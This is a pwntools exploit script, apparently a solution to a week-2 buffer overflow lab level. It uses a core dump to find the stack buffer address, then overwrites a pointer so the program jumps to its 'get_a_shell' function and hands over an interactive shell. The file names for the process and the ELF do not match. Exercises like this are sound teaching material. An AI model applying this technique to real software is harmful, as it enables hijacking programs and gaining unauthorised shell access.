  # week2-bof-level5
  #!/usr/bin/env python                                                            
                                                                                    
  from pwn import *                                                                
                                                                                    
  # create process and run the program                                             
  p = process("./bof-level5")                                                      
                                                                                    
  context.terminal = ['tmux', 'splitw', '-h']                                      
                                                                                    
  e = ELF('./bof-levelx')                                                          
  get_a_shell = e.symbols['get_a_shell']                                           
  print(hex(get_a_shell))                                                                                                                                    
                                                                                   
  buf = "A" * 0x84                                                                 
  if not os.path.exists('core'):                                                   
      p.sendline(buf)                                                              
      p.wait()                                                                     
                                                                                   
  c = Core('./core')                                                               
  buffer_addr = c.stack.find(buf)                                                  
  print(hex(buffer_addr))                                                                                                      
                                                                                   
  buf = "AAAA" + p32(get_a_shell) + "A" * (0x80 - 8) + p32(buffer_addr)                                                                                                        
                                                                                   
  p.sendline(buf)                                                                  
                                                                                   
  p.interactive() 